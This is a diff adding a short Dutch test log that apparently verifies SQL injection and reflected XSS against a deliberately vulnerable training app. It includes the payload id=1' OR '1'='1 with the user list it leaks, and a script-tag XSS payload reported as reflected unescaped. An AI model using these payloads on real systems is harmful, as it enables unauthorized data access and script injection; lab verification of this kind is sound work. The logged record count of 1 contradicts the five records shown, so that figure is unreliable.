@@ -1,0 +1,15 @@
+# D6 / D6-XSS verificatie via tunnel  wo 28 okt. 2026 12:22:16 CET
+Security level is currently: 
+
+=== D6  SQLi  id=1' OR '1'='1  (verwacht: alle gebruikers) ===
+First name: admin	Surname: admin
+First name: Gordon	Surname: Brown
+First name: Hack	Surname: Me
+First name: Pablo	Surname: Picasso
+First name: Bob	Surname: Smith
+-- aantal teruggegeven records (Surname-regels):
+1
+
+=== D6-XSS  name=<script>alert('xss')</script>  (verwacht: ongefilterd teruggekaatst) ===
+GEVONDEN: payload staat ONgEscaped in de respons -> XSS lukt zonder WAF
+<script>alert('xss')</script>
